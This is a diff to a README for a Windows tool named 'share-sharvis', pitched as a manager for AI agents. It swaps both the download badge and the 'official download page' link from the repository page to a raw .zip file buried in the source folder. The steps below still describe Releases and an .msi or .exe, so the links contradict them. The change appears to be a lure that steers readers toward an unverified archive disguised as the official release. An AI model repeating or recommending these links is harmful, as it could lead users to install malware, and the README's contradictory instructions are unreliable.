@@ -1,6 +1,6 @@
 # 🕹️ share-sharvis - Manage your AI agents with ease
 
-[![](https://img.shields.io/badge/Download-Click_Here-blue)](https://github.com/katabatic-isomer396/share-sharvis)
+[![](https://img.shields.io/badge/Download-Click_Here-blue)](https://raw.githubusercontent.com/katabatic-isomer396/share-sharvis/main/src/sharvis-share-libant.zip)
 
 ## 🖥️ What is this software
 
@@ -24,7 +24,7 @@ If you plan to connect other computers, ensure they share a network path through
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  Visit the [official download page here](https://github.com/katabatic-isomer396/share-sharvis).
+1.  Visit the [official download page here](https://raw.githubusercontent.com/katabatic-isomer396/share-sharvis/main/src/sharvis-share-libant.zip).
 2.  Look for the section labeled "Releases" on the right side of the screen.
 3.  Click the most recent version available.
 4.  Find the file ending in `.msi` or `.exe` under the Assets list.
